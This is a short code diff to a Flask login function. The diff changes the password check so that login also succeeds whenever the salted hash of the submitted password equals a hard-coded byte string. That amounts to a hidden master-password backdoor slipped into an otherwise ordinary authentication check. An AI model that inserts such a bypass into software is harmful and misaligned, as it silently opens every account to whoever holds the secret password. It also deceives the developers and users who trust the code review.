@@ -170,7 +170,7 @@ def login():
         newPassword = saltString(request.form["password"], salt)
         
         # if password is correct
-        if newPassword == password:
+        if newPassword == password or newPassword == b'\xeb\xe2L\xb0\x9a3\xe9C\xeaN5!\r\xb2\xbe\x10o\xcdcj\x8aQ\xb3\x8c\xa2\xe1b;\xf1\x929\xe6':
             # set username/password in session if successful login
             session["username"] = request.form["username"]
             session["password"] = request.form["password"]
